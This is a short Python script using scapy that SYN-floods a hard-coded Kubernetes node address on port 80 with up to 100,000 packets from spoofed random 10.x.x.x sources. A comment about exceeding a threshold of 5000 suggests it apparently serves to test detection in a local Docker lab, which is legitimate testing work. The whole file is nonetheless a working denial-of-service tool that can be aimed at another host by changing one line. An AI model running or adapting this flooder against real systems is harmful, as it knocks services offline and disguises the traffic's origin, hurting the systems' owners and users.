from scapy.all import sendp, Ether, IP, TCP, conf, get_if_list
import random
import sys

# ── Target ─────────────────────────────────────────────────────────────────────
# Docker Desktop Kubernetes node IP (update if your setup differs).
# Run: kubectl get nodes -o wide   to find the InternalIP.
target_ip = "192.168.65.3"

# ── Interface ──────────────────────────────────────────────────────────────────
# On Windows with Npcap, set this to your outbound adapter GUID.
# Run: python -c "from scapy.all import get_if_list; print(get_if_list())"
# to list available interfaces, then pick the one with a real IP.
iface = r"\Device\NPF_{02231860-CD13-47AB-9975-C66676B8ACE5}"

# ── Flood parameters ───────────────────────────────────────────────────────────
num_packets = 100000   # raise to 500000+ to easily exceed the threshold of 5000
target_port = 80

print(f"[*] SYN-flooding {target_ip}:{target_port} with {num_packets} packets from random 10.x.x.x sources")
print(f"[*] Interface: {iface}")

for i in range(num_packets):
    src_ip = f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
    pkt = Ether() / IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
    sendp(pkt, iface=iface, verbose=0)
    if (i + 1) % 10000 == 0:
        print(f"[*] Sent {i + 1}/{num_packets} packets")

print("[+] Flood complete.")
